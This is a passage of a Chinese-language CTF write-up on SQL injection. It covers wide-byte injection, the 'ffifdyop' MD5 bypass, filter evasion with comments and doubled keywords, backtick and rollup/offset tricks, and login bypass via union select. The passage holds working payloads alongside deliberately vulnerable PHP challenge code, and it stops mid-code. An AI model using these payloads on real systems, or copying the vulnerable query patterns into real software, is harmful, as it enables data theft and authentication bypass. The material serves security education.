<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; order by 2%23</span><br></pre></td></tr></table></figure>
<p>果然两个，顺带查看其用户，库名和版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,concat_ws(char(32,58,32),user(),database(),version())%23</span><br></pre></td></tr></table></figure>
<p>注:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># concat_ws()第一个参数是分隔字符</span><br><span class="line"># char(32,58,32)表示的是 &quot;:&quot; 号</span><br><span class="line">MariaDB [(none)]&gt; select concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;);</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| concat_ws(char(32,58,32),&apos;11&apos;,&apos;22&apos;,&apos;33&apos;) |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| 11 : 22 : 33                             |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>库名sae-chinalover,再爆表</p>
<p>单引号会被/注掉，所以写sae-chinalover的16进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7361652d6368696e616c6f766572)%23</span><br></pre></td></tr></table></figure></p>
<p>注：<br>group_concat()是将某个字段的所有值打印在一起，方便一行输出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(name) from aa;</span><br><span class="line">+-------------------+</span><br><span class="line">|group_concat(name) |</span><br><span class="line">+-------------------+</span><br><span class="line">|10,20,20|</span><br></pre></td></tr></table></figure>
<p>有四个：ctf,ctf2,ctf3,ctf4,news，爆列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 0x7361652d6368696e616c6f766572 and table_name=0x63746634)%23</span><br></pre></td></tr></table></figure>
<p>ctf4里有id,flag,flag应该就在这里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,(select group_concat(id,flag) from ctf4)%23</span><br></pre></td></tr></table></figure>
<p>可以看到构造爆错后常规注入即可。</p>
<h2 id="0x08-MD5加密后的SQLi"><a href="#0x08-MD5加密后的SQLi" class="headerlink" title="0x08 MD5加密后的SQLi"></a>0x08 MD5加密后的SQLi</h2><p>目标语句:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from admin where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>md5(string,raw)</p>
<p>string 必需。规定要计算的字符串。</p>
<p>raw 可选。规定十六进制或二进制输出格式：</p>
<p>• TRUE – 原始 16 字符二进制格式 &lt;关键点&gt;</p>
<p>• FALSE – 默认。32 十六进制数</p>
</blockquote>
<p>注入思路:</p>
<p>字符串经md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串</p>
<p>构造payload目标:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where password=&quot;or&apos;xxx&apos;</span><br></pre></td></tr></table></figure>
<p>可用payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line"></span><br><span class="line">md5加密为: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line"></span><br><span class="line">作hex转字符串: ?T0D??o#??’or’8.N=?</span><br><span class="line"></span><br><span class="line">content: ffifdyop</span><br><span class="line"></span><br><span class="line">md5加密为: 276f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">作hex转字符串: ‘or’6蒥欓!r,b</span><br></pre></td></tr></table></figure>
<p>注：这个问题是在PHP中存在的</p>
<h2 id="0x09-空格被过滤"><a href="#0x09-空格被过滤" class="headerlink" title="0x09 空格被过滤"></a>0x09 空格被过滤</h2><p>空格过滤使用<code>/*xxx*/</code>进行绕过，</p>
<p>有时候关键词被过滤了可以使用双写绕过</p>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//为三个字段，接着查库</span><br><span class="line">?id=1/*0*/order/*0*/by/*0*/3%23</span><br><span class="line"></span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,concat_ws(char(32,58,32),user(),database(),version())%23</span><br><span class="line"></span><br><span class="line">//查所有库</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(schema_name)/*0*/frfromom/*0*/information_schema.schemata%23</span><br><span class="line"></span><br><span class="line">//查test的表</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(table_name)/*0*/frfromom/*0*/information_schema.tables/*0*/where/*0*/table_schema=0x74657374%23</span><br><span class="line"></span><br><span class="line">//只有一个content,查列</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(column_name)/*0*/frfromom/*0*/information_schema.columns/*0*/where/*0*/table_schema=0x74657374/*0*/and/*0*/table_name=0x636f6e74656e74%23</span><br><span class="line"></span><br><span class="line">//有id,context,title。最后直接查context</span><br><span class="line">?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,context/*0*/frfromom/*0*/content%23</span><br><span class="line"></span><br><span class="line">//得到flag</span><br></pre></td></tr></table></figure>
<h2 id="0x10-符号问题"><a href="#0x10-符号问题" class="headerlink" title="0x10 符号问题"></a>0x10 <code></code>符号问题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>反引号是为了区分MySql的保留字段与普通字符而引入的符号</p>
<p>引号一般用在字段的值，如果字段值是字符或字符串，则要加引号</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select `flag` from flags;</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| flag                                   |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| flag&#123;37316894c36cb32d2ca3f7d3add88024&#125; |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select &apos;flag&apos; from flags;</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>payload:构造如下形式进行注入，***位置放入关键词<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">desc `***` `***`;</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; desc `flags` `union select table_name from information_schema.tables`;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/?table=test`  `union select table_name from information_schema.tables limit 1,1</span><br><span class="line"></span><br><span class="line">http://test.com/?table=test`  `union select column_name from information_schema.columns limit 1,1</span><br><span class="line"></span><br><span class="line">http://test.com/?table=test`  `union select flagUwillNeverKnow from secret_flag limit 1,1</span><br></pre></td></tr></table></figure>
<h2 id="0x11-rollup-amp-amp-offset"><a href="#0x11-rollup-amp-amp-offset" class="headerlink" title="0x11 rollup&amp;&amp;offset"></a>0x11 rollup&amp;&amp;offset</h2><p><code>limit 1 offset 2</code>从第二条记录开始查询，读取1条记录（intrude fuzz 1和2这两个位置的参数）</p>
<p><code>rollup</code>在group by 分组之后，再合计总数，可构造使得结果为null</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line"><span class="comment">#$sql="SELECT * FROM interest WHERE uname = ''  or 1=1 group by pwd with rollup limit 1 offset 2 #'";</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>获取flag需要满足<code>mysql_num_rows($query) == 1</code>和<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>，后者使用<code>group by pwd with rollup</code>在查询结果中加上一行，且pwd字段的值为NULL,以此绕过<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>过滤,则使用<code>limit # offset #</code>来满足<code>mysql_num_rows($query) == 1</code>,fuzz出<code>limit 1 offset 2</code></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #</span><br></pre></td></tr></table></figure>
<p>test</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select text from article group by NULL with rollup limit 1 offset 2 ;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from article;</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">| id      | text                                                |</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">| 1       | guess what?                                         |</span><br><span class="line">| 3       | you can test it with sqli                           |</span><br><span class="line">| 2       | dudulu                                              |</span><br><span class="line">| 4       | The choice of the stone gate of all dead destinies! |</span><br><span class="line">| 5       | ??? ???                                             |</span><br><span class="line">| 8848    | you want by a phone?                                |</span><br><span class="line">| 9588    | you will be lucky                                   |</span><br><span class="line">| 1245123 | flag&#123;37316894c36cb32d2ca3f7d3add88024&#125;              |</span><br><span class="line">+---------+-----------------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h2 id="0x12-注出可控数据绕过登录"><a href="#0x12-注出可控数据绕过登录" class="headerlink" title="0x12 注出可控数据绕过登录"></a>0x12 注出可控数据绕过登录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">welcome to simplexue</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</span><br><span class="line">    mysql_select_db(<span class="string">"phpformysql"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;input type=password name=pass value=<span class="string">"Password"</span>&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=<span class="string">"index.txt"</span>&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>利用user处的注入返回想要的pw</p>
<p>例如 <code>qwe，76d80224611fc919a5d54f0ff9fba446</code></p>
<p>username值<code>&#39; union select &#39;76d80224611fc919a5d54f0ff9fba446&#39;#</code></p>
<p>password值<code>qwe</code></p>
<p>提交获得flag</p>
<h2 id="0x13-htmlentities实体化单引号情况"><a href="#0x13-htmlentities实体化单引号情况" class="headerlink" title="0x13 htmlentities实体化单引号情况"></a>0x13 htmlentities实体化单引号情况</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#GOAL: get password from admin;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_assoc($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello "</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your password is:"</span>.$row[<span class="string">'pass'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure>
<p>htmlentities将单引号实体化了，所以可用\来将源单引号转义</p>
<p>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1=1 limit 2,3#&apos;;</span><br></pre></td></tr></table></figure></p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=\&amp;password=%20or%201=1%20limit%202,3%23</span><br></pre></td></tr></table></figure></p>
<h2 id="0x14-报错注入-amp-amp-00000select-amp-amp-‘-gt-x27"><a href="#0x14-报错注入-amp-amp-00000select-amp-amp-‘-gt-x27" class="headerlink" title="0x14 报错注入 &amp;&amp; /!00000select/ &amp;&amp; ‘-&gt;\x27"></a>0x14 报错注入 &amp;&amp; /<em>!00000select</em>/ &amp;&amp; ‘-&gt;\x27</h2><p>示例题目属于二次注入，在删除功能处进行注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$key <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array($v))&#123;</span><br><span class="line">            errorBox(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $k[<span class="number">0</span>] !=<span class="string">'_'</span>?$$k = addslashes($v):$$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $rstr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ord($str[$i])&gt;<span class="number">31</span> &amp;&amp; ord($str[$i])&lt;<span class="number">127</span>)&#123;</span><br><span class="line">            $rstr = $rstr.$str[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $rstr = str_replace(<span class="string">'\''</span>,<span class="string">''</span>,$rstr);</span><br><span class="line">    <span class="keyword">return</span> $rstr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($message))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\b(select|insert|update|delete)\b/i"</span>,$message))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(filter($message) !== $message)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql=<span class="string">"insert guestbook(`message`) value('$message');"</span>;</span><br><span class="line">    mysql_query($sql);</span><br><span class="line">    $sql = <span class="string">"select * from guestbook order by id limit 0,5;"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">            $id = $row[<span class="string">'id'</span>];</span><br><span class="line">            $message = $row[<span class="string">'message'</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"|$id|=&gt;|$message|&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $message = stripcslashes($message);</span><br><span class="line">    $sql = <span class="string">"delete from guestbook where id=$id or message ='$message';"</span>;</span><br><span class="line">    <span class="keyword">if</span>(!mysql_query($sql))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print(mysql_error());依据这句话看出可以使用报错注入</span></span><br><span class="line">    </span><br><span class="line">        <span 